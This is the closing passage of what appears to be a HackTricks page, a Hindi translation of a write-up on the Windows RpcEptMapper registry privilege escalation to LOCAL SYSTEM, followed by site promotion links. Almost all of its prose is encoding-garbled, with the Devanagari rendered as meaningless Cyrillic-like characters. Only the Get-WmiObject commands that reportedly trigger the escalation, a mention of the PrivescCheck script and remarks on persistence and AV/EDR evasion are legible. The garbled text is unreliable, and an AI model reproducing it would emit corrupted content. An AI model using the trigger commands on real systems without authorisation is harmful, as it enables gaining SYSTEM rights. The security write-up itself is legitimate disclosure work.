рдореИрдВрдиреЗ рдЕрдкреЗрдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдерд╛ рдХрд┐ рдореИрдВ `RpcEptMapper` рд╕реЗрд╡рд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ `NETWORK SERVICE` рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХрд╛рдВрддреНрд░рд┐рдд рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░реВрдВрдЧрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдРрд╕рд╛ рджрд┐рдЦрддрд╛ рд╣реИ рдХрд┐ рдореИрдВрдиреЗ рдЕрдкреЗрдХреНрд╖рд┐рдд рд╕реЗ рдмрд╣реБрдд рдмреЗрд╣рддрд░ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рд╣реИрдВред рдореИрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ `WMI` рд╕реЗрд╡рд╛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдПрдХрд╛рдВрддреНрд░рд┐рдд рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рд╣реИ, рдЬреЛ `LOCAL SYSTEM` рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддреА рд╣реИред рдпрд╣ рдХрд┐рддрдирд╛ рдЕрджреНрднреБрдд рд╣реИ! ![:sunglasses:](https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png)

> **рдиреЛрдЯ:** рдпрджрд┐ рдореИрдВ `NETWORK SERVICE` рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХрд╛рдВрддреНрд░рд┐рдд рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛, рддреЛ рдореИрдВ `LOCAL SYSTEM` рдЦрд╛рддреЗ рдХреЗ рдмрд╕ рдПрдХ рдЯреЛрдХрди рджреВрд░ рд╣реЛрддрд╛, рдЬреЛ рдЬреЗрдореНрд╕ рдлреЛрд░рд╢реЙ рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рдорд╣реАрдиреЗ рдкрд╣рд▓реЗ рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛: [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html).

рдореИрдВрдиреЗ рдкреНрд░рддреНрдпреЗрдХ WMI рдХрдХреНрд╖рд╛ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдФрд░ рдореИрдВрдиреЗ рдпрд╣реА рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдо рджреЗрдЦрд╛ рд╣реИред
```
Get-WmiObject Win32_Perf
Get-WmiObject Win32_PerfRawData
Get-WmiObject Win32_PerfFormattedData
```
## рдирд┐рд╖реНрдХрд░реНрд╖ <a href="#рдирд┐рд╖реНрдХрд░реНрд╖" id="рдирд┐рд╖реНрдХрд░реНрд╖"></a>

рдореБрдЭреЗ рдпрд╣ рд╡рд┐рдХрд░реНрд╖рдг рдХреА рдХрдордЬреЛрд░реА рдЗрддрдиреА рджреЗрд░ рддрдХ рдирдЬрд░ рдирд╣реАрдВ рдЖрдИ рд╣реИред рдПрдХ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЕрдиреНрдп рдЙрдкрдХрд░рдгреЛрдВ рдиреЗ рд╕рдВрдЧреНрд░рд╣ рдореЗрдВ рдкреВрд░реНрдг рд▓реЗрдЦрди рдкрд╣реБрдВрдЪ рдХреА рддрд▓рд╛рд╢ рдХреА рд╣реЛрдЧреА, рдЬрдмрдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ `AppendData/AddSubdirectory` рдкрд░реНрдпрд╛рдкреНрдд рдерд╛ред "рдЧрд▓рдд рд░реВрдк рд╕реЗ рд╕рдорд╛рдХреГрддрд┐" рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ, рдореИрдВ рдорд╛рди рд▓реЗрддрд╛ рд╣реВрдВ рдХрд┐ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдореБрдЭреЗ рдХреЛрдИ рдРрд╕рд╛ рд╕реНрдерд┐рддрд┐ рдирд╣реАрдВ рдЖрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛ рд╕рдХрддреА рд╣реИред

рдореИрдВрдиреЗ рдЗрд╕ рд╡рд┐рдХрд░реНрд╖рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджреЛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдирд┐рд░реНрдгрдп рд▓рд┐рдпрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдпрд╣ рд╣реИ рдХрд┐ рдореИрдВрдиреЗ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЗрд╕реЗ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдмрдирд╛рдпрд╛ - рд╢реБрд░реВ рдореЗрдВ рдЗрд╕реЗ рд╕рдордЭрдиреЗ рдХреЗ рдмрд┐рдирд╛ - рдЬрд┐рд╕ рджрд┐рди рдореИрдВрдиреЗ рдЕрдкрдиреЗ PrivescCheck рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ `GetModfiableRegistryPath` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдерд╛, рдЬреЛ рдХрдИ рдорд╣реАрдиреЗ рдкрд╣рд▓реЗ рдерд╛ред рджреВрд╕рд░рд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдкреНрд░рднрд╛рд╡ рдХрдо рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рдкрд╣реБрдВрдЪ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдпрд╣ рдХреЗрд╡рд▓ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЕрдм рд╕рдорд░реНрдерд┐рдд рдирд╣реАрдВ рд╣реИрдВ (рдпрджрд┐ рдЖрдкрдиреЗ Extended Support рдЦрд░реАрджрд╛ рд╣реИ рддреЛ ...). рдЗрд╕ рд╕рдордп, рдпрджрд┐ рдЖрдк рдЕрднреА рднреА Windows 7 / Server 2008 R2 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЗрди рдорд╢реАрдиреЛрдВ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдирд╛ рд╢рд╛рдпрдж рдЖрдкрдХреА рдЪрд┐рдВрддрд╛рдУрдВ рдореЗрдВ рд╕рдмрд╕реЗ рдХрдо рд╣реЛрдЧрд╛ред

рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд┐рдХрд░реНрд╖рдг рдХреА рдХрд┐рд╕реНрд╕реЗ рдХреА рдЕрд▓рд╛рд╡рд╛, рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ "рдкреНрд░рджрд░реНрд╢рди" рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗрдЯрд┐рдВрдЧ рдкреЛрд╕реНрдЯ рдЙрддреНрдкрд╛рджрди, рдЕрдиреНрддрд░реНрдЧрдд рдЪрд▓рди рдФрд░ AV/EDR рдЯрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк рдЕрд╡рд╕рд░ рдЦреЛрд▓рддрд╛ рд╣реИред рдореЗрд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдХрд╛ рдЦреНрдпрд╛рд▓ рд╣реИ рд▓реЗрдХрд┐рди рдореИрдВрдиреЗ рдЙрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХрд╛ рднреА рдкрд░реАрдХреНрд╖рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реИред рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП?...

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks** рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
